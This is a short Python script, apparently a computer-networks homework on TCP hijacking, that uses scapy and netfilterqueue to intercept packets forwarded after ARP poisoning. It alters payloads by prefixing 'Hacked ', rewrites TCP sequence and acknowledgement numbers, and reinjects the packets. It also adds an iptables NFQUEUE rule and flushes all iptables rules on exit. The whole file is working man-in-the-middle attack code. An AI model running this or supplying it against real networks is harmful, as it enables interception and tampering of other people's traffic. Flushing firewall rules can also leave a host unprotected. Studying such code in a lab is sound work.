# REFERENCES
# for the dictionaries SYN and ACK: https://github.com/DariusBuhai/FMI-Unibuc/tree/main/Year%20II/Semester%202/Retele%20de%20calculatoare/Teme/Tema%202/tcp_hijack

import os
import time
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ


hacked_seq = dict()
hacked_ack = dict()

def detect_and_alter_packet(packet):
    
    global hacked_seq 
    global hacked_ack

    # IP() will include the whole package, TCP and Raw as well
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):

        F = scapy_packet['TCP'].flags
        IPF = scapy_packet[IP].flags

        # calculate the old & new -- sequence & acknowledgement numbers
        old_seq = scapy_packet['TCP'].seq
        old_ack = scapy_packet['TCP'].ack
        new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
        new_ack = hacked_ack[old_ack] if old_ack in hacked_ack.keys() else old_ack

        msg = scapy_packet[Raw].load

        # PSH - the segment will be sent to the layer application the fastest
        if F & 0x08: 
            msg = scapy.packet.Raw(b'Hacked ' + bytes(scapy_packet[TCP].payload))
        

        hacked_seq[old_seq + len(scapy_packet['TCP'].payload)] = new_seq + len(msg)
        hacked_ack[new_seq + len(msg)] = old_seq + len(scapy_packet['TCP'].payload)

        # modify the load of the packet and 
        # add the new sequence and acknowledgement number
        scapy_packet[Raw].load = msg
        scapy_packet['TCP'].seq = new_seq
        scapy_packet['TCP'].ack = new_ack

        # delete the checksum for IP and TCP,
        # scapy will recalculate them automatically
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum

        send(scapy_packet)

    else:
        packet.accept()
    


print('waitinng for ARP to poison')
time.sleep(2)
print("Started to alter packages")
# define the NetfilterQUEUE
queue = NFQ()
try:
    # all the messages forwarded through the router( middle undercover)
    # will be intercepted by the queue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")

    # bind need to have the same number as the queue --> 10
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()

